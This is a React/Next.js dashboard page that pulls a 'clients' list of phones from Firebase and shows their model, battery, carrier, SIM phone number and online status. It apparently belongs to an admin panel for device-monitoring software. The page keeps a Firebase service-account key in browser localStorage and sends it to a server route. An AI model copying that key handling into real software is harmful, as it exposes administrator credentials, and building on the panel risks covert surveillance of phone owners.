'use client';

import { useEffect, useState, useCallback } from 'react';
import { Smartphone, Wifi, WifiOff, RefreshCw, Settings2 } from 'lucide-react';
import { useAuth } from '@/components/auth-provider';
import Link from 'next/link';

interface QuickDevice {
  id: string;
  name: string;
  online: boolean;
  battery?: number;
  network?: string;
  phone?: string;
  lastSeen?: number;
}

function toStr(v: unknown): string { return v != null ? String(v).trim() : ''; }
function toNum(v: unknown): number | undefined {
  if (typeof v === 'number') return v;
  if (typeof v === 'string' && v !== '') { const n = Number(v); if (!isNaN(n)) return n; }
  return undefined;
}
function firstVal(obj: Record<string, unknown>, keys: string[]): unknown {
  for (const k of keys) if (obj[k] != null && obj[k] !== '') return obj[k];
  return undefined;
}

function isOnlineRaw(raw: Record<string, unknown>): boolean {
  for (const k of ['online', 'Online', 'isOnline', 'IsOnline', 'connected', 'Connected', 'active', 'Active', 'isActive', 'IsActive', 'isConnected'])
    if (raw[k] === true) return true;
  for (const k of ['online', 'Online', 'isOnline', 'connected', 'active', 'status', 'Status', 'state', 'State']) {
    const v = String(raw[k] ?? '').toLowerCase();
    if (v === 'true' || v === '1' || v === 'yes' || v === 'online' || v === 'connected' || v === 'active') return true;
  }
  const tsKeys = ['lastSeen', 'LastSeen', 'updatedAt', 'UpdatedAt', 'lastActive', 'lastUpdate', 'timestamp', 'time', 'lastOnline'];
  for (const k of tsKeys) {
    const ts = raw[k];
    if (typeof ts === 'number' && ts > 0) {
      const ms = ts > 9999999999 ? ts : ts * 1000;
      if (Date.now() - ms < 5 * 60 * 1000) return true;
    }
  }
  return false;
}

function parseQuick(id: string, raw: Record<string, unknown>): QuickDevice {
  const flat: Record<string, unknown> = { ...raw };
  const sims = raw['sims'] ?? raw['Sims'];
  if (Array.isArray(sims) && sims.length > 0) {
    const s0 = sims[0] as Record<string, unknown>;
    if (s0?.phoneNumber && !flat['phoneNumber']) flat['phoneNumber'] = s0.phoneNumber;
    if (s0?.network && !flat['network']) flat['network'] = s0.network;
    if (s0?.operator && !flat['operator']) flat['operator'] = s0.operator;
    if (s0?.provider && !flat['provider']) flat['provider'] = s0.provider;
  }
  const nets = raw['networks'] ?? raw['Networks'];
  if (Array.isArray(nets) && nets.length > 0 && !flat['provider']) flat['provider'] = String(nets[0]);

  const online = isOnlineRaw(raw) || isOnlineRaw(flat);

  const brand = toStr(firstVal(flat, ['Brand', 'brand']));
  const model = toStr(firstVal(flat, ['modelName', 'model', 'Model', 'deviceModel', 'Device', 'phoneModel']));
  const name = brand && model && !model.toLowerCase().startsWith(brand.toLowerCase())
    ? `${brand} ${model}` : (model || brand || id.slice(0, 12));

  return {
    id, name, online,
    battery: toNum(firstVal(flat, ['batteryPercent', 'BatteryPercent', 'battery', 'Battery', 'batteryLevel', 'bat', 'level', 'charge', 'percentage'])),
    network: toStr(firstVal(flat, ['provider', 'Provider', 'network', 'Network', 'operator', 'Operator', 'carrier'])) || undefined,
    phone: toStr(firstVal(flat, ['mobNo', 'MobNo', 'phoneNumber', 'PhoneNumber', 'phone', 'mobile', 'number'])) || undefined,
    lastSeen: toNum(firstVal(flat, ['lastSeen', 'LastSeen', 'updatedAt', 'timestamp', 'time', 'lastActive'])),
  };
}

function loadStr(k: string): string { try { return localStorage.getItem(k) ?? ''; } catch { return ''; } }

function timeAgo(ts: number): string {
  const diff = Math.floor((Date.now() - (ts > 9999999999 ? ts : ts * 1000)) / 1000);
  if (diff < 60) return `${diff}s ago`;
  if (diff < 3600) return `${Math.floor(diff / 60)}m ago`;
  if (diff < 86400) return `${Math.floor(diff / 3600)}h ago`;
  return `${Math.floor(diff / 86400)}d ago`;
}

export default function DashboardPage() {
  const { idToken, user } = useAuth();
  const [devices, setDevices] = useState<QuickDevice[]>([]);
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');
  const [rtdbUrl, setRtdbUrl] = useState('');

  useEffect(() => { setRtdbUrl(loadStr('panel_rtdb_url')); }, []);

  const fetchDevices = useCallback(async () => {
    const url = loadStr('panel_rtdb_url');
    const saRaw = loadStr('panel_service_account');
    if (!url) return;
    if (!saRaw && !idToken) return;
    setLoading(true); setError('');
    try {
      let data: unknown;
      if (saRaw) {
        const res = await fetch('/api/admin-devices', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ serviceAccount: JSON.parse(saRaw), rtdbUrl: url, path: '/clients' }),
          signal: AbortSignal.timeout(15000),
        });
        const json = await res.json() as { data?: unknown; error?: string };
        if (json.error) { setError(json.error); return; }
        data = json.data;
      } else {
        const res = await fetch(`${url.replace(/\/$/, '')}/clients.json?auth=${idToken}`, {
          cache: 'no-store', signal: AbortSignal.timeout(10000),
        });
        if (!res.ok) { setError(`Firebase ${res.status}`); return; }
        data = await res.json();
      }
      if (!data || typeof data !== 'object') { setDevices([]); return; }
      const parsed = Object.entries(data as Record<string, unknown>)
        .filter(([, v]) => v && typeof v === 'object' && !Array.isArray(v))
        .map(([id, raw]) => parseQuick(id, raw as Record<string, unknown>))
        .sort((a, b) => (b.lastSeen ?? 0) - (a.lastSeen ?? 0));
      setDevices(parsed);
    } catch (e) {
      setError(e instanceof Error ? e.message : 'Fetch failed');
    } finally { setLoading(false); }
  }, [idToken]);

  useEffect(() => {
    fetchDevices();
    const t = setInterval(fetchDevices, 30_000);
    return () => clearInterval(t);
  }, [fetchDevices]);

  const onlineCount = devices.filter(d => d.online).length;
  const onlineDevices = devices.filter(d => d.online).slice(0, 5);
  const offlineDevices = devices.filter(d => !d.online).slice(0, 5);

  if (!rtdbUrl) {
    return (
      <div className="flex flex-col items-center justify-center h-96 gap-4 text-center">
        <Settings2 className="w-12 h-12 text-slate-600" />
        <div>
          <p className="text-slate-200 font-semibold">Firebase not configured</p>
          <p className="text-sm text-slate-400 mt-1">Settings mein google-services.json ya RTDB URL daalo</p>
        </div>
        <Link href="/settings" className="btn-primary">Settings</Link>
      </div>
    );
  }

  return (
    <div className="space-y-5 animate-fade-in">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-2xl font-bold text-slate-900 dark:text-white">Dashboard</h1>
          <p className="text-sm text-slate-500 dark:text-slate-400 mt-0.5">
            Welcome back{user?.email ? `, ${user.email.split('@')[0]}` : ''}
          </p>
        </div>
        <button onClick={fetchDevices} disabled={loading} className="btn-secondary p-2">
          <RefreshCw className={`w-4 h-4 ${loading ? 'animate-spin' : ''}`} />
        </button>
      </div>

      {/* Stat Cards */}
      <div className="grid grid-cols-3 gap-4">
        <div className="card p-5 border dark:border-slate-700/60">
          <div className="flex items-center justify-between mb-3">
            <p className="text-xs font-bold text-slate-400 tracking-widest uppercase">Total</p>
            <div className="w-8 h-8 rounded-lg bg-slate-700/50 flex items-center justify-center">
              <Smartphone className="w-4 h-4 text-slate-400" />
            </div>
          </div>
          <p className="text-3xl font-extrabold text-white">{loading && devices.length === 0 ? '…' : devices.length}</p>
          <p className="text-xs text-slate-400 mt-1">registered devices</p>
        </div>

        <div className="card p-5 border dark:border-emerald-800/40 dark:bg-emerald-950/20">
          <div className="flex items-center justify-between mb-3">
            <p className="text-xs font-bold text-emerald-400 tracking-widest uppercase">Online</p>
            <div className="w-8 h-8 rounded-lg bg-emerald-500/20 flex items-center justify-center">
              <Wifi className="w-4 h-4 text-emerald-400" />
            </div>
          </div>
          <p className="text-3xl font-extrabold text-emerald-400">{loading && devices.length === 0 ? '…' : onlineCount}</p>
          <p className="text-xs text-slate-400 mt-1">
            {devices.length > 0 ? `${Math.round(onlineCount / devices.length * 100)}% active` : 'no devices'}
          </p>
        </div>

        <div className="card p-5 border dark:border-red-800/30 dark:bg-red-950/10">
          <div className="flex items-center justify-between mb-3">
            <p className="text-xs font-bold text-red-400 tracking-widest uppercase">Offline</p>
            <div className="w-8 h-8 rounded-lg bg-red-500/10 flex items-center justify-center">
              <WifiOff className="w-4 h-4 text-red-400" />
            </div>
          </div>
          <p className="text-3xl font-extrabold text-red-400">{loading && devices.length === 0 ? '…' : devices.length - onlineCount}</p>
          <p className="text-xs text-slate-400 mt-1">inactive devices</p>
        </div>
      </div>

      {error && (
        <div className="bg-red-950/40 border border-red-800/50 rounded-lg px-4 py-3 text-sm text-red-400">
          {error}
        </div>
      )}

      {/* Online + Offline side by side */}
      {devices.length > 0 && (
        <div className="grid grid-cols-2 gap-4">
          {/* Online */}
          <div className="card overflow-hidden">
            <div className="flex items-center justify-between px-4 py-3 border-b border-slate-700/50 bg-emerald-950/20">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-emerald-400 animate-pulse" />
                <h2 className="text-sm font-semibold text-emerald-400">Online</h2>
              </div>
              <Link href="/devices?filter=online" className="text-xs text-slate-400 hover:text-slate-200">View all →</Link>
            </div>
            {onlineDevices.length === 0 ? (
              <div className="px-4 py-6 text-center text-sm text-slate-500">Koi device online nahi</div>
            ) : (
              <div className="divide-y divide-slate-700/40">
                {onlineDevices.map(d => (
                  <div key={d.id} className="flex items-center gap-3 px-4 py-2.5">
                    <div className="w-1.5 h-1.5 rounded-full bg-emerald-400 animate-pulse flex-shrink-0" />
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-slate-100 truncate">{d.name}</p>
                      <p className="text-xs text-slate-400 truncate">{d.phone || d.network || '—'}</p>
                    </div>
                    {d.battery != null && <span className="text-xs text-emerald-400 flex-shrink-0">{d.battery}%</span>}
                  </div>
                ))}
              </div>
            )}
          </div>

          {/* Offline */}
          <div className="card overflow-hidden">
            <div className="flex items-center justify-between px-4 py-3 border-b border-slate-700/50 bg-red-950/10">
              <div className="flex items-center gap-2">
                <span className="w-2 h-2 rounded-full bg-red-500 flex-shrink-0" />
                <h2 className="text-sm font-semibold text-red-400">Offline</h2>
              </div>
              <Link href="/devices?filter=offline" className="text-xs text-slate-400 hover:text-slate-200">View all →</Link>
            </div>
            {offlineDevices.length === 0 ? (
              <div className="px-4 py-6 text-center text-sm text-slate-500">Sab online hain</div>
            ) : (
              <div className="divide-y divide-slate-700/40">
                {offlineDevices.map(d => (
                  <div key={d.id} className="flex items-center gap-3 px-4 py-2.5">
                    <div className="w-1.5 h-1.5 rounded-full bg-slate-500 flex-shrink-0" />
                    <div className="flex-1 min-w-0">
                      <p className="text-sm font-medium text-slate-300 truncate">{d.name}</p>
                      <p className="text-xs text-slate-500 truncate">{d.phone || d.network || '—'}</p>
                    </div>
                    {d.lastSeen && <span className="text-[10px] text-slate-500 flex-shrink-0">{timeAgo(d.lastSeen)}</span>}
                  </div>
                ))}
              </div>
            )}
          </div>
        </div>
      )}

      {/* All devices link */}
      {devices.length > 0 && (
        <Link href="/devices" className="block card px-4 py-3 text-center text-sm text-brand-400 hover:text-brand-300 font-medium transition-colors">
          View all {devices.length} devices →
        </Link>
      )}
    </div>
  );
}
